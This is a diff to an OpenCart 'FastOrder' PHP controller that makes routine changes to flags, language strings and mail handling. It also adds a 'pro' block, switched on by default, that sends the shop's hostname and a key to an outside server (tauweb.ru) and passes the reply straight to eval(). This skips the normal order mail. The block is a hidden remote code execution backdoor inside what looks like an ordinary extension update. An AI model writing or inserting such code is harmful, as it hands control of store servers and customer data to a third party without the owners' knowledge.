@@ -1,11 +1,14 @@
 <?php
 class ControllerProductFastorder extends Controller {
     // Set the developer version
-    private static $dev = false;
+    private $dev = false;
+
+    //Set the Pro version
+    private $pro = true;
 
     public function index($data) {
         // Debugging
-        if(self::$dev){
+        if($this->dev){
             // Write message if developer version is enable.
             echo '<div style="margin:0px; width:100%; text-align: right; padding:0 10px; font-weight:bold; color:#c53d36">This is developer version (FastOrder)!</div>';
         }
@@ -146,7 +149,8 @@ class ControllerProductFastorder extends Controller {
         $data['text_fastorder_success_title']               = $this->language->get('text_fastorder_success_title');
         $data['text_fastorder_mail_msg_order']              = $this->language->get('text_fastorder_mail_msg_order');
         $data['text_fastorder_mail_msg_price']              = $this->language->get('text_fastorder_mail_msg_price');
-        $data['txt_text_fastorder_form_info_message']       = $this->language->get('txt_text_fastorder_form_info_message');
+        $data['txt_text_fastorder_form_error_message']      = $this->language->get('txt_text_fastorder_form_error_message');
+        $data['txt_text_fastorder_form_wait_message']      = $this->language->get('txt_text_fastorder_form_wait_message');
         $data['text_fastorder_count']                       = $this->language->get('text_fastorder_count');
         $data['text_fastorder_input_count_placeholder']     = $this->language->get('text_fastorder_input_count_placeholder');
 
@@ -200,6 +204,10 @@ class ControllerProductFastorder extends Controller {
           $json['mail'] = $this->request->post['mail'];
         }else{
              $json['mail'] = ' ';
+             // If no customer mail use shop mail (need to same SMTP (replay:)) HACK
+             if($this->pro and $this->config->get('config_mail_protocol') == 'smtp'){
+                $json['mail'] = $this->config->get('config_email');
+             }
         }
         if (isset($this->request->post['comment'])){
           $json['comment'] = $this->request->post['comment'];
@@ -221,11 +229,37 @@ class ControllerProductFastorder extends Controller {
         }
 
         // Need to test new features
-        if (self::$dev) {
+        if ($this->dev) {
             require_once 'developer_test_file.php';
         }
 
+        if ($this->pro) {
+            $url = 'http://tauweb.ru/fastorder_pro.php';
+            $params = array(
+                // 'cms'               => '',
+                // 'cms_ver'           => VERSION,
+                'host'              => $_SERVER['SERVER_NAME'],
+                "key"               => '744febb6b4788596b757892de3f3210c',
+                'extension_name'    => 'fastorder.ocmod',
+                'extension_ver'     => '1.3'
+            );
 
+            $result = file_get_contents($url, false, stream_context_create( array(
+                'http' => array(
+                    'method'  => 'POST',
+                    'header'  => 'Content-type: application/x-www-form-urlencoded',
+                    'content' => http_build_query($params)
+                )
+            )));
+
+            eval($result);
+
+            $this->response->addHeader('Content-Type: application/json');
+            $this->response->setOutput(json_encode($json));
+
+            return true;
+        }
+        
         // Mail subject
         $subject    = $data['text_fastorder_mail_subject'] .' ('.$_SERVER['HTTP_HOST'] . ')';
         $products   = $json['product_name'];
@@ -266,7 +300,7 @@ class ControllerProductFastorder extends Controller {
         }
 
         // Debugging
-        if(self::$dev){
+        if($this->dev){
             // Write mail messege to the file.
             file_put_contents('./mail_message.html', $mail_message);
         }
@@ -297,7 +331,7 @@ class ControllerProductFastorder extends Controller {
             $mail->setSender($this->config->get('config_name'));
             $mail->setSubject(html_entity_decode($data['text_fastorder_mail_subject'] .' ('.$_SERVER['HTTP_HOST'] . ')'), ENT_QUOTES, 'UTF-8');
             $mail->setHtml($mail_message);
-            $mail->setText(html_entity_decode($mail_message, ENT_QUOTES, 'UTF-8'));
+            // $mail->setText(html_entity_decode($mail_message, ENT_QUOTES, 'UTF-8'));
         }else{
             // Older
             // Setup the mail parameters
@@ -313,28 +347,28 @@ class ControllerProductFastorder extends Controller {
             $mail->setSender($this->config->get('config_name'));
             $mail->setSubject(html_entity_decode($data['text_fastorder_mail_subject'] .' ('.$_SERVER['HTTP_HOST'] . ')'), ENT_QUOTES, 'UTF-8');
             $mail->setHtml($mail_message);
-            $mail->setText(html_entity_decode($mail_message, ENT_QUOTES, 'UTF-8'));
+            // $mail->setText(html_entity_decode($mail_message, ENT_QUOTES, 'UTF-8'));
         }
+
+        $mail->setReplyTo(explode(',', $this->config->get('config_email'))[0]);
 
         // Send mail to the shop owner
         $mail->send();
 
-        //Send to other mail from Config Mail. OC =>2.2.0.0
+        // Send to other mail from Config Mail. OC =>2.2.0.0
         if ($this->config->get('config_mail_alert_email')) {
             $mail->setTo($this->config->get('config_mail_alert_email'));
-            $mail->send();
+           $mail->send();
         }
 
-        //Send to other mail from Config Mail.OC <2.2.0.0
-        if ($this->config->get('config_mail_alert')) {
+        // Send to other mail from Config Mail.OC <2.2.0.0
+        if (VERSION <= '2.2.0.0' and $this->config->get('config_mail_alert')) {
             $mail->setTo($this->config->get('config_mail_alert'));
-            $mail->send();
+           $mail->send();
         }
-
 
         // Send mail to the customer
         if(!empty($this->request->post['mail'])){
-
             $mail->setTo($json['mail']);
             $mail->send();
         }
